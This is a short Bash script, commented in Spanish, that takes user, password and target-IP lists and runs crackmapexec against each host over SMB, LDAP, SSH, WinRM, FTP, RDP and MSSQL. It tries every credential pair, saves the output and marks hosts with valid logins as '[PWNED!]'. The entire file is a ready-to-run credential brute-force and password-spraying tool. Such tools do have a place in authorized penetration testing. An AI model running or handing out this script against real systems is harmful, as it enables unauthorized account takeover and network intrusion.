#!/bin/bash

# Solicitar archivos de usuarios y contraseñas
read -p "Ingrese el archivo de usuarios: " USERS_FILE
read -p "Ingrese el archivo de contraseñas: " PASSWORDS_FILE
read -p "Ingrese el archivo de IPs objetivo: " HOSTS_FILE
OUTPUT_FILE="resultados_final.txt"

# Verificar que los archivos existen
if [[ ! -f "$USERS_FILE" || ! -f "$PASSWORDS_FILE" || ! -f "$HOSTS_FILE" ]]; then
    echo "Uno o más archivos no existen. Verifique las rutas."
    exit 1
fi

# Limpiar archivo de salida
echo "===== Resultados de Enumeración =====" > "$OUTPUT_FILE"

# Protocolos a evaluar
PROTOCOLS=("smb" "ldap" "ssh" "winrm" "ftp" "rdp" "mssql")

# Bucle para recorrer cada protocolo
for PROTOCOL in "${PROTOCOLS[@]}"; do
    echo -e "\n============================" | tee -a "$OUTPUT_FILE"
    echo "[*] Enumerando $PROTOCOL" | tee -a "$OUTPUT_FILE"
    echo "============================" | tee -a "$OUTPUT_FILE"

    # Ejecutar crackmapexec y almacenar salida en variable
    CME_OUTPUT=$(crackmapexec $PROTOCOL "$HOSTS_FILE" -u "$USERS_FILE" -p "$PASSWORDS_FILE" 2>&1)

    # Verificar si hay resultados antes de escribir en el archivo
    if [[ -z "$CME_OUTPUT" ]]; then
        echo "[-] No se encontraron respuestas para $PROTOCOL" | tee -a "$OUTPUT_FILE"
    else
        echo "$CME_OUTPUT" | tee -a "$OUTPUT_FILE"
        # Si hay credenciales válidas, marcar como [PWNED!]
        if echo "$CME_OUTPUT" | grep -iq "pwn3d\|valid credentials"; then
            echo "[PWNED!] Credenciales válidas encontradas en $PROTOCOL" | tee -a "$OUTPUT_FILE"
        fi
    fi
done

echo -e "\n===== Escaneo finalizado. Resultados guardados en $OUTPUT_FILE ====="
